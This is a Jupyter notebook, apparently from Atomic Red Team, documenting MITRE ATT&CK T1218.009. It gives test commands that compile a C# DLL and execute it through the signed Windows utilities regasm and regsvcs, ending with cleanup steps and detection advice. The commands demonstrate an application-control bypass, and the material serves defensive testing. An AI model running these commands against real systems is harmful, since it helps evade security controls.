{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f6c1abd5",
   "metadata": {},
   "source": "# T1218.009 - Regsvcs/Regasm\nAdversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)"
  },
  {
   "cell_type": "markdown",
   "id": "22817c77",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "eca81b77",
   "metadata": {},
   "source": "### Atomic Test #1 - Regasm Uninstall Method Call Test\nExecutes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The CSharp source file must exist on disk at specified location (#{source_file})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs\" -OutFile \"PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08e0bed7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.009 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b75b7a7d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1218.009.dll\" /target:library PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1218.009.dll\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a353fa6f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.009 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "14d2bf9b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %tmp%\\T1218.009.dll >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37e49bc4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.009 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ab3f10aa",
   "metadata": {},
   "source": "### Atomic Test #2 - Regsvcs Uninstall Method Call Test\nExecutes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: The CSharp source file must exist on disk at specified location (#{source_file})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs\" -OutFile \"PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd375549",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.009 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "72eb3c3a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1218.009.dll\" /target:library /keyfile:$env:Temp\\key.snk PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "34623cc2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.009 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ffd82f4e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $Env:TEMP\\T1218.009.dll -ErrorAction Ignore | Out-Null\n$parentpath = Split-Path -Path \"$Env:TEMP\\T1218.009.dll\"\nRemove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null\nRemove-Item $parentpath\\T1218.009.tlb -ErrorAction Ignore | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "937bc695",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.009 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "05235ee4",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}